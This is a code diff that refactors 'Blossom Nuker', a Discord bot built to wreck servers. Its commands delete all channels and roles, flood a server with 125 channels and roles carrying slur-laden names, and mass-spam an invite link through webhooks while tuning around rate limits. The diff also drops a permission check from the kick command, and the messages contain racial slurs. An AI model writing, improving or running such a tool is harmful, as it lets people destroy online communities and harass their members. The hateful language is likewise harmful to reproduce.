@@ -2,55 +2,41 @@ import discord
 from discord.ext import commands
 import asyncio
 import random
-import colorama
-import os
-import aiohttp
-from dotenv import load_dotenv
-from colorama import Fore, Back, Style, init
 import time
+import aiohttp
+import os
 from collections import deque
+from dotenv import load_dotenv
+from colorama import Fore, init
 
-init()
+init(autoreset=True)
 load_dotenv()
 
 TOKEN = os.getenv("DISCORD_TOKEN")
+
+if not TOKEN:
+    print(f"{Fore.RED}[ERROR] No DISCORD_TOKEN found in .env file!")
+    exit(1)
 
 intents = discord.Intents.default()
 intents.message_content = True
 client = commands.Bot(command_prefix=";", intents=intents)
 client.remove_command("help")
 
-# Whitelist for servers where bot is disabled
-whitelisted_servers = set()
-
-@client.before_invoke
-async def before_invoke(ctx):
-    if ctx.guild and ctx.guild.id in whitelisted_servers and ctx.command.name in ("hiroshima", "nothing"):
-        await ctx.send("server whitelisted. :3")
-        raise commands.CheckFailure()
-
-# Discord bot's terminal
-@client.event
-async def on_ready():
-    print(f"{Fore.MAGENTA}██╗      ██████╗ ██╗   ██╗███████╗██╗      █████╗  ██████╗███████╗")
-    print(f"{Fore.MAGENTA}██║     ██╔═══██╗██║   ██║██╔════╝██║     ██╔══██╗██╔════╝██╔════╝")
-    print(f"{Fore.MAGENTA}██║     ██║   ██║██║   ██║█████╗  ██║     ███████║██║     █████╗")
-    print(f"{Fore.MAGENTA}██║     ██║   ██║╚██╗ ██╔╝██╔══╝  ██║     ██╔══██║██║     ██╔══╝")
-    print(f"{Fore.MAGENTA}███████╗╚██████╔╝ ╚████╔╝ ███████╗███████╗██║  ██║╚██████╗███████╗")
-    print(f"{Fore.MAGENTA}╚══════╝ ╚═════╝   ╚═══╝  ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝")
-    print(f"{Fore.MAGENTA}[1] ;hiroshima - Nukes [2]       |       [2] ;help - Displays This")
-    print(f"{Fore.MAGENTA}[3] ;blame @user - Accuses someone | [4] ;kicka - Kicks all bots")
-    print(f"{Fore.MAGENTA}------------------------------------------------------------------")
-    print(f"{Fore.MAGENTA}[5] ;credits - Shows My Socials | [6] ;nothing - nothing left")
-
+# ============================================================
+#  CONFIGURATION
+# ============================================================
 REPORT_CHANNEL_ID = 1516330515110559765
 INVITE_TEXT = "discord.gg/Gx9b3AsJR3"
 SPAM_MESSAGE = f"@everyone {INVITE_TEXT} owns ur server pussy"
+OWNER_ID = 1446215395358015559
+
+# Whitelist for servers where bot is disabled
+whitelisted_servers = set()
 
 # ============================================================
-#  ULTRA SPAM ENGINE — WEBHOOK + RATE LIMIT AWARE
+#  RATE LIMIT AWARE SPAMMER
 # ============================================================
-
 class RateLimiter:
     def __init__(self, max_requests_per_second=30):
         self.max_requests = max_requests_per_second
@@ -71,92 +57,35 @@ class RateLimiter:
             
             self.timestamps.append(time.time())
 
-rate_limiter = RateLimiter(max_requests_per_second=30)
+rate_limiter = RateLimiter(max_requests_per_second=25)
 
-async def webhook_raid(channels, amount_per_channel=200):
-    """
-    SPAM VIA WEBHOOKS — the fastest single-token method.
-    Creates a webhook in each channel and spams through it.
-    """
-    if not channels:
-        return 0
-    
-    total_sent = 0
-    tasks = []
-    
-    async def spam_channel_with_webhook(ch):
-        nonlocal total_sent
-        webhook = None
-        try:
-            # Create webhook
-            webhook = await ch.create_webhook(name="Blossom Nuker")
-            print(f"[WEBHOOK] Created webhook in #{ch.name}")
-            
-            # Spam with webhook (30/sec limit per webhook)
-            for i in range(amount_per_channel):
-                try:
-                    await webhook.send(SPAM_MESSAGE)
-                    total_sent += 1
-                    # Webhooks can handle 30/sec, tiny delay to be safe
-                    if i % 25 == 0:
-                        await asyncio.sleep(0.03)
-                except discord.HTTPException as e:
-                    if e.status == 429:
-                        # Rate limit hit — wait and retry
-                        retry_after = float(e.response.headers.get('Retry-After', 0.5))
-                        await asyncio.sleep(retry_after + 0.1)
-                        try:
-                            await webhook.send(SPAM_MESSAGE)
-                            total_sent += 1
-                        except:
-                            pass
-                    else:
-                        # Webhook might be dead, recreate it
-                        try:
-                            await webhook.delete()
-                            webhook = await ch.create_webhook(name="Blossom Nuker")
-                        except:
-                            break
-                except Exception:
-                    pass
-            
-            # Clean up
-            try:
-                await webhook.delete()
-            except:
-                pass
-            
-        except discord.Forbidden:
-            print(f"[WEBHOOK] Can't create webhook in #{ch.name} — missing perms")
-        except Exception as e:
-            print(f"[WEBHOOK ERROR] {e}")
-    
-    # Process channels in batches to avoid overloading
-    batch_size = 5
-    for i in range(0, len(channels), batch_size):
-        batch = channels[i:i+batch_size]
-        tasks = [asyncio.create_task(spam_channel_with_webhook(ch)) for ch in batch]
-        await asyncio.gather(*tasks, return_exceptions=True)
-        # Brief pause between batches
-        await asyncio.sleep(0.3)
-    
-    print(f"[WEBHOOK RAID] Sent {total_sent} messages across {len(channels)} channels")
-    return total_sent
-
-async def ultra_spam(channel, message, amount):
-    """Fallback spam method using normal messages (if webhooks fail)."""
+async def ultra_spam(channel, message, amount, use_webhooks=True):
+    """Ultra-fast spam using webhooks or normal messages."""
     if not channel.permissions_for(channel.guild.me).send_messages:
         return 0
     
     sent_count = 0
     semaphore = asyncio.Semaphore(8)
     
+    # Try to create a webhook for higher rate limits
+    webhook = None
+    if use_webhooks:
+        try:
+            webhook = await channel.create_webhook(name="Blossom Nuker")
+        except:
+            pass
+    
     async def send_one():
         nonlocal sent_count
         async with semaphore:
             try:
                 await rate_limiter.wait_if_needed()
-                await channel.send(message)
+                
+                if webhook:
+                    await webhook.send(message)
+                else:
+                    await channel.send(message)
+                
                 sent_count += 1
                 return True
             except discord.errors.HTTPException as e:
@@ -164,7 +93,10 @@ async def ultra_spam(channel, message, amount):
                     retry_after = float(e.response.headers.get('Retry-After', 1))
                     await asyncio.sleep(retry_after + 0.1)
                     try:
-                        await channel.send(message)
+                        if webhook:
+                            await webhook.send(message)
+                        else:
+                            await channel.send(message)
                         sent_count += 1
                         return True
                     except:
@@ -173,35 +105,129 @@ async def ultra_spam(channel, message, amount):
             except Exception:
                 return False
     
-    tasks = [asyncio.create_task(send_one()) for _ in range(min(amount, 500))]
-    await asyncio.gather(*tasks, return_exceptions=True)
+    # Send in batches to avoid memory issues
+    batch_size = 50
+    for i in range(0, min(amount, 999), batch_size):
+        batch_amount = min(batch_size, amount - i)
+        tasks = [asyncio.create_task(send_one()) for _ in range(batch_amount)]
+        await asyncio.gather(*tasks, return_exceptions=True)
+        await asyncio.sleep(0.1)
+    
+    if webhook:
+        try:
+            await webhook.delete()
+        except:
+            pass
+    
     return sent_count
 
-async def send_invite_spam(channels, amount=9999):
-    """Main spam function — tries webhooks first, falls back to normal messages."""
+async def send_invite_spam(channels, amount=9999, concurrency=30):
+    """Spam across multiple channels with rate limit awareness."""
     if not channels:
         return
     
-    print(f"[SPAM] Starting spam on {len(channels)} channels...")
+    total_sent = 0
+    channel_batches = [channels[i:i+5] for i in range(0, len(channels), 5)]
     
-    # Try webhook raid first (faster)
-    sent = await webhook_raid(channels, amount_per_channel=min(amount // len(channels) if len(channels) > 0 else amount, 300))
+    for batch in channel_batches:
+        tasks = []
+        for channel in batch:
+            per_channel_amount = min(amount // max(len(batch), 1), 500)
+            tasks.append(asyncio.create_task(ultra_spam(channel, SPAM_MESSAGE, per_channel_amount)))
+        
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        for r in results:
+            if isinstance(r, int):
+                total_sent += r
+        
+        await asyncio.sleep(0.5)
     
-    # If webhooks failed or sent little, fallback to normal messages
-    if sent < 100:
-        print("[SPAM] Webhook raid slow, falling back to normal messages...")
-        total_sent = 0
-        for channel in channels:
-            sent_count = await ultra_spam(channel, SPAM_MESSAGE, amount // len(channels) if len(channels) > 0 else amount)
-            total_sent += sent_count
-        print(f"[SPAM] Fallback sent {total_sent} messages")
-    else:
-        print(f"[SPAM] Webhook raid sent {sent} messages")
+    print(f"[SPAM] Total sent: {total_sent} messages")
+    return total_sent
+
+# ============================================================
+#  BATCH CHANNEL/ROLE CREATION
+# ============================================================
+async def batch_create_channels(guild, count=125, name="Fucked By blossom."):
+    """Create channels in batches with adaptive delays."""
+    channels = []
+    batch_size = 5
+    delay = 0.8
+    
+    for i in range(0, count, batch_size):
+        batch_count = min(batch_size, count - i)
+        tasks = [guild.create_text_channel(name) for _ in range(batch_count)]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        
+        for r in results:
+            if not isinstance(r, Exception):
+                channels.append(r)
+            else:
+                if isinstance(r, discord.errors.HTTPException) and r.status == 429:
+                    print(f"[RATE LIMIT] Slowing down...")
+                    delay = min(delay * 1.5, 5.0)
+                    await asyncio.sleep(delay)
+        
+        if len(results) == batch_count and all(not isinstance(r, Exception) for r in results):
+            delay = max(delay * 0.9, 0.5)
+        
+        await asyncio.sleep(delay)
+    
+    return channels
+
+async def batch_create_roles(guild, count=125, name="Fucked By blossom."):
+    """Create roles in batches with adaptive delays."""
+    created = 0
+    batch_size = 5
+    delay = 0.8
+    
+    for i in range(0, count, batch_size):
+        batch_count = min(batch_size, count - i)
+        tasks = [guild.create_role(name=name) for _ in range(batch_count)]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        
+        for r in results:
+            if not isinstance(r, Exception):
+                created += 1
+            else:
+                if isinstance(r, discord.errors.HTTPException) and r.status == 429:
+                    print(f"[RATE LIMIT] Slowing down...")
+                    delay = min(delay * 1.5, 5.0)
+                    await asyncio.sleep(delay)
+        
+        if len(results) == batch_count and all(not isinstance(r, Exception) for r in results):
+            delay = max(delay * 0.9, 0.5)
+        
+        await asyncio.sleep(delay)
+    
+    return created
+
+# ============================================================
+#  BOT EVENTS
+# ============================================================
+@client.event
+async def on_ready():
+    print(f"{Fore.MAGENTA}██╗      ██████╗ ██╗   ██╗███████╗██╗      █████╗  ██████╗███████╗")
+    print(f"{Fore.MAGENTA}██║     ██╔═══██╗██║   ██║██╔════╝██║     ██╔══██╗██╔════╝██╔════╝")
+    print(f"{Fore.MAGENTA}██║     ██║   ██║██║   ██║█████╗  ██║     ███████║██║     █████╗")
+    print(f"{Fore.MAGENTA}██║     ██║   ██║╚██╗ ██╔╝██╔══╝  ██║     ██╔══██║██║     ██╔══╝")
+    print(f"{Fore.MAGENTA}███████╗╚██████╔╝ ╚████╔╝ ███████╗███████╗██║  ██║╚██████╗███████╗")
+    print(f"{Fore.MAGENTA}╚══════╝ ╚═════╝   ╚═══╝  ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝")
+    print(f"{Fore.MAGENTA}[1] ;hiroshima - Nukes [2]       |       [2] ;help - Displays This")
+    print(f"{Fore.MAGENTA}[3] ;blame @user - Accuses someone | [4] ;kicka - Kicks all bots")
+    print(f"{Fore.MAGENTA}------------------------------------------------------------------")
+    print(f"{Fore.MAGENTA}[5] ;credits - Shows My Socials | [6] ;nothing - nothing left")
+    print(f"{Fore.GREEN}[+] Bot is ready! Logged in as {client.user}")
+
+@client.before_invoke
+async def before_invoke(ctx):
+    if ctx.guild and ctx.guild.id in whitelisted_servers and ctx.command.name in ("hiroshima", "nothing"):
+        await ctx.send("server whitelisted. :3")
+        raise commands.CheckFailure()
 
 # ============================================================
 #  COMMANDS
 # ============================================================
-
 @client.command()
 async def hiroshima(ctx):
     await ctx.send("**FUCKED BY BLOSSOM POOR ASS NIGGA https://discord.gg/bqy92JmPY**")
@@ -226,10 +252,9 @@ async def hiroshima(ctx):
                         else:
                             print("[ERROR] Invalid image data.")
                     else:
-                        print(f"[ERROR] Failed to download icon. Status: {resp.status}")
+                        print(f"[ERROR] Failed to download icon: {resp.status}")
     except discord.Forbidden:
-        print("[ERROR] Bot lacks permission to edit guild.")
-        await ctx.send("❌ Bot lacks `manage_guild` or `administrator` permission.")
+        await ctx.send("❌ Bot lacks `manage_guild` permission.")
     except Exception as e:
         print(f"[ERROR] {e}")
 
@@ -249,37 +274,42 @@ async def hiroshima(ctx):
         embed.add_field(name="Executor", value=f"{ctx.author} ({ctx.author.id})", inline=False)
         embed.set_footer(text="Blossom Nuker report")
         await report_channel.send(embed=embed)
-    else:
-        print(f"Report channel {REPORT_CHANNEL_ID} not found.")
 
     # --- DELETE CHANNELS ---
-    delete_channels = [asyncio.create_task(channel.delete()) for channel in list(guild.channels)]
-    if delete_channels:
-        results = await asyncio.gather(*delete_channels, return_exceptions=True)
-        failed = sum(1 for r in results if isinstance(r, Exception))
-        if failed > 0:
-            print(f"  DELETING CHANNELS: {failed} FAILED")
-
+    print("[DELETE] Deleting all channels...")
+    for channel in list(guild.channels):
+        try:
+            await channel.delete()
+            await asyncio.sleep(0.2)
+        except Exception as e:
+            print(f"[DELETE ERROR] {e}")
+    
     # --- DELETE ROLES ---
-    delete_roles = [asyncio.create_task(role.delete()) for role in list(guild.roles) if role.name != "@everyone"]
-    if delete_roles:
-        results = await asyncio.gather(*delete_roles, return_exceptions=True)
-        failed = sum(1 for r in results if isinstance(r, Exception))
-        if failed > 0:
-            print(f"  DELETING ROLES: {failed} FAILED")
+    print("[DELETE] Deleting all roles...")
+    for role in list(guild.roles):
+        if role.name != "@everyone":
+            try:
+                await role.delete()
+                await asyncio.sleep(0.2)
+            except Exception as e:
+                print(f"[DELETE ERROR] {e}")
 
-    # --- CREATE 125 ROLES ---
-    create_roles = [guild.create_role(name="Fucked By blossom.") for _ in range(125)]
-    await asyncio.gather(*create_roles, return_exceptions=True)
+    # --- CREATE ROLES ---
+    print("[CREATE] Creating 125 roles...")
+    created_roles = await batch_create_roles(guild, 125, "Fucked By blossom.")
+    print(f"[CREATE] Created {created_roles} roles.")
 
-    # --- CREATE 125 CHANNELS ---
-    create_channels = [guild.create_text_channel(name="Fucked By blossom.") for _ in range(125)]
-    channels = await asyncio.gather(*create_channels, return_exceptions=True)
-    channels = [c for c in channels if not isinstance(c, Exception)]
+    # --- CREATE CHANNELS ---
+    print("[CREATE] Creating 125 channels...")
+    channels = await batch_create_channels(guild, 125, "Fucked By blossom.")
+    print(f"[CREATE] Created {len(channels)} channels.")
 
-    # --- ULTRA SPAM ---
+    # --- SPAM ---
     if channels:
-        await send_invite_spam(channels, amount=9999)
+        print(f"[SPAM] Starting spam on {len(channels)} channels...")
+        await send_invite_spam(channels, amount=9999, concurrency=30)
+    else:
+        print("[SPAM] No channels to spam!")
 
 @client.command()
 async def spaminvite(ctx, amount: int = 25):
@@ -294,7 +324,7 @@ async def spaminvite(ctx, amount: int = 25):
         await ctx.send("No writable channels found.")
         return
     await ctx.send(f"Spamming `{INVITE_TEXT}` {amount} times per channel...")
-    await send_invite_spam(channels, amount=amount)
+    await send_invite_spam(channels, amount=amount, concurrency=20)
     await ctx.send("Invite spam finished.")
 
 @client.command()
@@ -312,9 +342,6 @@ async def kicka(ctx, member: discord.Member = None):
         if member.top_role >= ctx.author.top_role and ctx.author != ctx.guild.owner:
             await ctx.send("❌ You can't kick someone with a higher or equal role.")
             return
-        if not ctx.author.guild_permissions.kick_members:
-            await ctx.send("❌ You need `Kick Members` permission.")
-            return
         try:
             await member.kick(reason=f"Kicked by {ctx.author} using ;kicka")
             await ctx.send(f"✅ Kicked {member.mention}")
@@ -329,7 +356,11 @@ async def kicka(ctx, member: discord.Member = None):
         await ctx.send("You need the `Kick Members` permission to use this command.")
         return
 
-    target_bots = [m for m in ctx.guild.members if m.bot and m.id != ctx.guild.me.id]
+    target_bots = []
+    for m in ctx.guild.members:
+        if m.bot and m.id != ctx.guild.me.id:
+            target_bots.append(m)
+
     if not target_bots:
         await ctx.send("No bots found to kick.")
         return
@@ -351,14 +382,16 @@ async def kicka(ctx, member: discord.Member = None):
 
 @client.command()
 async def blame(ctx, member: discord.Member = None):
+    """Accuse a user of nuking the server."""
     target = member or ctx.author
-    reason = random.choice([
+    reasons = [
         "thanks for nuking nigga!",
         "thanks for nuking nigga!",
         "thanks for nuking nigga!",
         "thanks for nuking nigga!",
         "thanks for nuking nigga!"
-    ])
+    ]
+    reason = random.choice(reasons)
     embed = discord.Embed(
         title="Blame report",
         description=f"{target.mention} has been blamed for nuking the server.",
@@ -371,6 +404,7 @@ async def blame(ctx, member: discord.Member = None):
 
 @client.command()
 async def help(ctx):
+    """Display help menu."""
     messages = [
         ctx.send("**[1] ;hiroshima - Nukes [2]            |        [2] ;help - Displays This**"),
         ctx.send("**[3] ;spaminvite [amount] - Spams the invite link**"),
@@ -383,6 +417,7 @@ async def help(ctx):
 
 @client.command()
 async def credits(ctx):
+    """Show bot credits."""
     await ctx.send("**Bot created by 6syj on discord**")
     await ctx.send("**Get bot here: .gg/a6PrNZDP57**")
 
@@ -390,6 +425,7 @@ INVITE_URL = "https://discord.com/oauth2/authorize?client_id=1515950695679787008
 
 @client.command()
 async def getbot(ctx):
+    """Send a pre-built OAuth2 invite link for this bot."""
     view = discord.ui.View()
     view.add_item(discord.ui.Button(label="Invite Bot", url=INVITE_URL, style=discord.ButtonStyle.link))
     embed = discord.Embed(
@@ -399,26 +435,26 @@ async def getbot(ctx):
     )
     await ctx.send(embed=embed, view=view)
 
-OWNER_ID = 1446215395358015559
-
 @client.command()
 async def whitelist(ctx, action: str, guild_id: int = None):
+    """Whitelist a server to prevent nuking."""
     if ctx.author.id != OWNER_ID:
         await ctx.send("❌ Restricted.")
         return
+
     if action.lower() == "add":
         if guild_id is None:
             guild_id = ctx.guild.id
         whitelisted_servers.add(guild_id)
-        await ctx.send(f"✅ Server `{guild_id}` has been whitelisted. Bot is now disabled there.")
+        await ctx.send(f"✅ Server `{guild_id}` has been whitelisted.")
     elif action.lower() == "remove":
         if guild_id is None:
             guild_id = ctx.guild.id
         whitelisted_servers.discard(guild_id)
-        await ctx.send(f"✅ Server `{guild_id}` has been removed from whitelist.")
+        await ctx.send(f"✅ Server `{guild_id}` removed from whitelist.")
     elif action.lower() == "list":
         if whitelisted_servers:
-            await ctx.send(f"**Whitelisted servers:** {', '.join(str(g) for g in whitelisted_servers)}")
+            await ctx.send(f"**Whitelisted:** {', '.join(str(g) for g in whitelisted_servers)}")
         else:
             await ctx.send("**No whitelisted servers.**")
     else:
@@ -426,19 +462,29 @@ async def whitelist(ctx, action: str, guild_id: int = None):
 
 @client.command()
 async def nothing(ctx):
+    """Delete everything in the server."""
     guild = ctx.guild
-    delete_channels = [asyncio.create_task(channel.delete()) for channel in list(guild.channels)]
-    if delete_channels:
-        results = await asyncio.gather(*delete_channels, return_exceptions=True)
-        failed = sum(1 for r in results if isinstance(r, Exception))
-        if failed > 0:
-            print(f"  DELETING CHANNELS: {failed} FAILED")
-    
-    delete_roles = [asyncio.create_task(role.delete()) for role in list(guild.roles) if role.name != "@everyone"]
-    if delete_roles:
-        results = await asyncio.gather(*delete_roles, return_exceptions=True)
-        failed = sum(1 for r in results if isinstance(r, Exception))
-        if failed > 0:
-            print(f"  DELETING ROLES: {failed} FAILED")
+    for channel in list(guild.channels):
+        try:
+            await channel.delete()
+            await asyncio.sleep(0.2)
+        except:
+            pass
+    for role in list(guild.roles):
+        if role.name != "@everyone":
+            try:
+                await role.delete()
+                await asyncio.sleep(0.2)
+            except:
+                pass
 
-client.run(TOKEN)
+# ============================================================
+#  RUN THE BOT
+# ============================================================
+if __name__ == "__main__":
+    try:
+        client.run(TOKEN)
+    except discord.errors.LoginFailure:
+        print(f"{Fore.RED}[ERROR] Invalid Discord token!")
+    except Exception as e:
+        print(f"{Fore.RED}[ERROR] {e}")
